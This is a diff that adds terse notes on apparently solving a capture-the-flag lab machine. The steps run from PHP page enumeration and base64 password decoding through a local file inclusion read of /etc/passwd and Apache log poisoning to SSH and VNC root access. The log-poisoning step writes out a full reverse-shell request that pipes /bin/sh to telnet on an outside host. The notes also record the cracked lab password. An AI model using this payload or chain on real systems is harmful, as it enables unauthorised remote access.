@@ -1,0 +1,49 @@
+OS:
+- FreeBSD
+
+Open Ports:
+
+
+- enumerating port 80
+- 4 php pages:
+ini.php, info.php, listfiles.php, phpinfo.php
+
+ini.php:
+- mysql may be installed on server
+
+info.php:
+- FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017 root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64
+
+listfiles.php:
+- Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt )
+
+phpinfo.php:
+- default php info page exposed
+
+- listfiles shows file: http://10.10.10.84/pwdbackup.txt
+- curl file to crack password
+- created python script to loop for 13 base64 decodes
+- found password: Charix!2#4%6&8(0
+
+- need username
+- found LFI from http://10.10.10.84/browse.php?
+- got contents of /etc/passwd
+- username: charix
+
+Log Poisoning vulnerability:
+- default log file for freebsd apache: /var/log/httpd-access.log
+- testing with echo, is interpreting php code
+- running cmd to get shell:
+GET /browse.php?file=/var/log/httpd-access.log&hi=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+10.10.14.9+9999+>+/tmp/f
+
+- got access to box, password file available from here as well
+- ssh as charix
+- file in home dir called secret.zip
+- copied to local machine
+- unzip using same password as user
+- got file 'secret', unable to read contents due to encoding
+- reviewing open local ports on target
+- vnc ports
+- ssh tunnel to local machine
+- tried connecting using secret as password
+- root access
